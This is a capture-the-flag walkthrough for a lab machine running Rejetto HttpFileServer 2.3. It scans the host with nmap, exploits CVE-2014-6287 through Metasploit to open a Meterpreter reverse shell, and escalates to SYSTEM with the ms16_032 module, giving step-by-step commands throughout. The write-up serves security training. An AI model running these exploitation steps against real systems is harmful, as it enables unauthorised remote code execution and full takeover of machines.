excerpt: This walkthrough details the exploitation of a HttpFileServer vulnerability.
---

## Objective

Get root by attacking the HttpFileServer version using Metasploit.

---

## Nmap.

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.10.8 -vvv -sCV

Discovered open port 80/tcp on 10.10.10.8

PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 HttpFileServer httpd 2.3
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: HFS /
|_http-server-header: HFS 2.3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

In the nmap scan we see that only port 80 is open, that it is a Windows machine due to the TTL shown, and that the service running on that port is HttpFileServer version httpd 2.3.

## Investigation.

With this information, the first thing we do is search online for possible vulnerabilities of that version, and we find this:

### Critical Vulnerability in Rejetto HTTP File Server (CVE-2014-6287)

**Type:** Code Injection (Improper Control of Code Generation, CWE-94)

**Date:** Published in 2014, last updated in 2025

**Description:** A flaw in the `findMacroMarker` function allows remote attackers to execute arbitrary code by sending a specific %00 sequence in a search action.

**Impact:** Very high, with a CVSS v3.x score of 9.8 (critical) and CVSS v2.0 score of 10.0 (high).

## Explotation

```bash
msfconsole # Open the Metasploit console
search HttpFileServer # Search for any available exploit modules; only one option appears:
" 0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution"
use 0 # Select the exploit to use
options # Check the required options to run the exploit
# Requires RHOST (target IP) and LHOST (our IP)
set RHOSTS 10.10.10.8
set LHOST your_ip
run # Launch the exploit
# This returns a Meterpreter shell on the victim machine. Next, how to get the first flag.
```

## User Flag.
```bash
With the Meterpreter session obtained: 
shell # Open a standard shell (for convenience)
whoami # It shows we are user 'kostas'
dir # List files in the current directory and find the first flag
type user.txt
```
---

## Privilege escalation.

```bash
# To see how to escalate privileges, background the session by typing:
background
use /post/multi/recon/local_exploit_suggester # Use this module to find possible privilege escalation exploits
set SESSION 1 # Set the session to the one we just backgrounded
run
# The module returns potential vulnerabilities:
 1   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/bypassuac_sluihijack                     Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 8.1/Windows Server 2012 R2 build detected!
 5   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 6   exploit/windows/local/tokenmagic                               Yes        
# We will use option 5
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
set SESSION 1
options # It requires LHOST
set LHOST your_ip
run
# We get a new shell.
getuid # We check the user; it should be NT AUTHORITY\SYSTEM, which means privilege escalation succeeded.
```

## ROOT FLAG
```bash
cd /
cd Administrator/Desktop #There is the flag
```
